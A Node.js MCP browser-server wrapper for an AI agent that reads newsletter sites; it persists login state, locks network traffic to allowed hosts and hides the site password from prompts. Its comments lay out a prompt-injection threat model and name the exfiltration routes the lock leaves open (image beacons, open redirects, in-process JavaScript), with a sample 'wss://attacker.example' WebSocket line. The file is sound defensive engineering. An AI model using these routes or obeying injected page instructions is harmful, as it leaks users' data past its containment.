#!/usr/bin/env node
//
// The stealth browser MCP server, with three things the published one does not do.
//
// 1. **The storage state is the harness's, never the model's.** The context is seeded from
//    MOTET_STORAGE_STATE_IN when it is created, and storageState() is written to
//    MOTET_STORAGE_STATE_OUT after every `browser_execute` and again at shutdown — so a run
//    that logs in and then runs out of clock still leaves the cookies that login bought.
//    The spike had the model export the state through its own output and paid 13.7k output
//    tokens for one run of it. `browser_execute` is the only tool that can navigate or
//    submit a form; the others read. If the upstream server ever grows one that writes,
//    this override list is what has to grow with it.
//
// 2. **Navigation is locked to the hosts this run was given** (design option G3):
//    MOTET_ALLOWED_HOSTS, which is the site's domain plus the hosts of the links the
//    newsletter itself carried. See `navigationAllowed` for the three rules it covers and
//    the two limits it does not — a passive sub-resource beacon, and an open redirect on an
//    allowed host — and `installWebSocketLock` for the fourth, which needs its own Playwright
//    API because `context.route` never sees a WebSocket handshake.
//
//    Read what this is honestly. It is a lock on the browser, not a sandbox on the process:
//    browser_execute evaluates the model's JavaScript in *this* Node process, so a
//    determined instruction injected from a page could reach past it. What actually bounds
//    the blast radius is design option D2 — this container's service account holds nothing
//    — and the fact that this process's environment carries no vendor key and no bearer.
//    The lock is here because it makes the ordinary accident (a page that says "continue
//    reading at example.net") a refused request rather than a fetch.
//
// 3. **The site password is in this process's environment and never in the prompt.** The
//    agent fills a password field with `process.env.MOTET_SITE_PASSWORD`, which it can read
//    but never sees, so the value is in no prompt, no tool argument and no transcript.
//
// Run by motet_enrich.pi as the `browser` MCP server. `NODE_PATH` points at the image's
// node_modules, because this file lives outside it.

import { writeFileSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";

// The toolchain is installed at MOTET_ENRICH_TOOLCHAIN_DIR/node_modules and this file is
// not inside it, so plain bare-specifier resolution would not find it. createRequire
// against NODE_PATH is the ESM-safe way to ask Node where the package actually is.
//
// Resolved inside `main`, not at module scope, so that the two pure functions below can be
// imported and tested — by `enrich/harness/browser-mcp.test.mjs`, which `bin/ci` runs — on
// a machine with no Chromium and no node_modules. The navigation lock is the piece of this
// file most worth a test and the piece hardest to reach through a real browser.
const load = (specifier) => {
  const require = createRequire(`${process.env.NODE_PATH}/`);
  return import(pathToFileURL(require.resolve(specifier)).href);
};

const STATE_IN = process.env.MOTET_STORAGE_STATE_IN;
const STATE_OUT = process.env.MOTET_STORAGE_STATE_OUT;
const ALLOWED = (process.env.MOTET_ALLOWED_HOSTS ?? "")
  .split(",")
  .map((host) => host.trim().toLowerCase())
  .filter(Boolean);

/** Whether a host is one of the allowed ones, or a subdomain of one. */
export function hostAllowed(host, allowed = ALLOWED) {
  const name = String(host ?? "").toLowerCase().replace(/\.$/, "");
  if (!name) return false;
  return allowed.some((entry) => name === entry || name.endsWith(`.${entry}`));
}

// Resource types that can carry data *out* to a host of the page's choosing.
//
// `websocket` is deliberately NOT here: `context.route` never sees a WebSocket handshake —
// that is what `routeWebSocket` exists for — so listing it would have been a rule the
// browser never consults, and the unit test would have asserted a predicate nothing asks.
// `installWebSocketLock` below is the real answer.
const EXFILTRATING = new Set(["xhr", "fetch", "eventsource"]);

/**
 * Whether this request may be issued. Three rules, and each bounds a different thing.
 *
 * 1. **A top-level navigation off-site is refused**, which is where the browsing context
 *    ends up and the rule the design (option G3) names.
 * 2. **A sub-frame navigation off-site is refused.** An injected `<iframe src=…>` is a way
 *    to put an attacker's origin inside the page without ever navigating it.
 * 3. **An off-site `fetch`/XHR/WebSocket is refused**, which is the shape an injected
 *    instruction uses to send what it read somewhere. Blocking it costs a publisher's
 *    analytics call and nothing the agent needs.
 *
 * **Passive sub-resources — images, stylesheets, fonts, media, scripts — are NOT filtered,
 * and that is a stated limit rather than an oversight.** A publisher's page loads a dozen
 * CDN hosts and blocking those breaks the page outright; an `<img src="https://…/?d=…">`
 * beacon therefore still gets out. Exfiltration cannot be closed in a browser that renders
 * third-party pages, which is why what actually bounds the blast radius is option D2 — this
 * container's service account holds nothing.
 *
 * **A redirect continuation is followed**, because a newsletter's tracking link is an
 * allowed URL that 302s onward, often through a third host. That is also the rule's
 * weakest point: an *open redirect* on an allowed host lets a page send the browser
 * off-site through it. Refusing redirects outright would refuse the only link most
 * newsletters carry, so this is a trade rather than a gap nobody noticed.
 */
export function navigationAllowed(request, allowed = ALLOWED) {
  const type = request.resourceType();
  const navigation = request.isNavigationRequest();
  if (!navigation && !EXFILTRATING.has(type)) return true;
  if (navigation && request.redirectedFrom()) return true;
  try {
    return hostAllowed(new URL(request.url()).hostname, allowed);
  } catch {
    return false;
  }
}

/**
 * Refuse a WebSocket to a host outside the allowlist.
 *
 * Its own call because `context.route` does not intercept the WebSocket handshake at all —
 * a page opening `new WebSocket('wss://attacker.example/…')` is invisible to the request
 * router, so without this the exfiltration rule in `navigationAllowed` covers `fetch` and
 * XHR and quietly does not cover the one transport built for a long-lived channel.
 *
 * `routeWebSocket` is Playwright 1.48+. Guarded rather than assumed, because a base-image
 * bump that removed it should cost a warning rather than every browser call.
 */
export async function installWebSocketLock(context, allowed = ALLOWED) {
  if (typeof context?.routeWebSocket !== "function") {
    console.error("[motet] this Playwright has no routeWebSocket; WebSockets are not locked");
    return false;
  }
  await context.routeWebSocket("**/*", (ws) => {
    let host = null;
    try {
      host = new URL(ws.url()).hostname;
    } catch {
      host = null;
    }
    if (host && hostAllowed(host, allowed)) {
      ws.connectToServer();
      return;
    }
    // Not connected to the server at all, so nothing leaves. Closing rather than hanging,
    // so a page that opens one fails fast instead of waiting out the run's clock.
    console.error(`[motet] refused websocket to ${ws.url()}`);
    ws.close({ code: 1008, reason: "blocked by client" });
  });
  return true;
}

/** The published client, with the three additions this file exists for. */
function seededClientClass(PlaywrightClient) {
  return class SeededPlaywrightClient extends PlaywrightClient {
    async createContext(options) {
      let storageState;
      if (STATE_IN) {
        try {
          storageState = JSON.parse(readFileSync(STATE_IN, "utf-8"));
        } catch (error) {
          // A missing or corrupt state file is a run that has to log in, not a failed one.
          console.error(`[motet] could not read saved browser state: ${error.message}`);
        }
      }
      await super.createContext({ ...(options ?? {}), ...(storageState ? { storageState } : {}) });
      // Both locks are per-context and both are installed here, on the one context the
      // harness makes per run. A context opened any other way would carry neither.
      await installWebSocketLock(this.context);
      // Always installed, never conditional on the list being non-empty: an empty
      // MOTET_ALLOWED_HOSTS means *nothing* is allowed, which is what a run that was
      // handed no site should get. Skipping the route on an empty list would have been
      // fail-open in the one place this file calls itself a control.
      await this.context.route("**/*", async (route, request) => {
        if (navigationAllowed(request)) {
          await route.continue();
          return;
        }
        console.error(`[motet] refused ${request.resourceType()} to ${request.url()}`);
        await route.abort("blockedbyclient");
      });
    }

    async execute(code, options) {
      try {
        return await super.execute(code, options);
      } finally {
        await this.saveState();
      }
    }

    async saveState() {
      if (!STATE_OUT || !this.context) return;
      try {
        writeFileSync(STATE_OUT, JSON.stringify(await this.context.storageState()), {
          mode: 0o600,
        });
      } catch (error) {
        console.error(`[motet] could not save browser state: ${error.message}`);
      }
    }
  };
}

async function main() {
  const { createMCPServer } = await load("playwright-stealth-mcp-server/shared/index.js");
  const { PlaywrightClient } = await load("playwright-stealth-mcp-server/shared/server.js");
  const { StdioServerTransport } = await load("@modelcontextprotocol/sdk/server/stdio.js");
  const SeededPlaywrightClient = seededClientClass(PlaywrightClient);

  const { server, registerHandlers, cleanup } = createMCPServer({
    version: "motet",
    ignoreHttpsErrors: process.env.IGNORE_HTTPS_ERRORS === "true",
    // No microphone, camera, geolocation or clipboard for a process reading articles. The
    // upstream default is to grant every permission there is.
    permissions: [],
  });
  let client = null;
  await registerHandlers(server, () => {
    client = new SeededPlaywrightClient({
      stealthMode: process.env.STEALTH_MODE === "true",
      headless: process.env.HEADLESS !== "false",
      timeout: Number.parseInt(process.env.TIMEOUT ?? "30000", 10),
      navigationTimeout: Number.parseInt(process.env.NAVIGATION_TIMEOUT ?? "60000", 10),
      ignoreHttpsErrors: process.env.IGNORE_HTTPS_ERRORS === "true",
      permissions: [],
    });
    return client;
  });

  const shutdown = async () => {
    if (client) await client.saveState();
    await cleanup();
    process.exit(0);
  };
  process.on("SIGINT", shutdown);
  process.on("SIGTERM", shutdown);

  await server.connect(new StdioServerTransport());
  console.error("[motet] browser MCP server ready");
}

// `import.meta.main` is Node 24's; the argv comparison is what works on 22 as well.
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  await main();
}
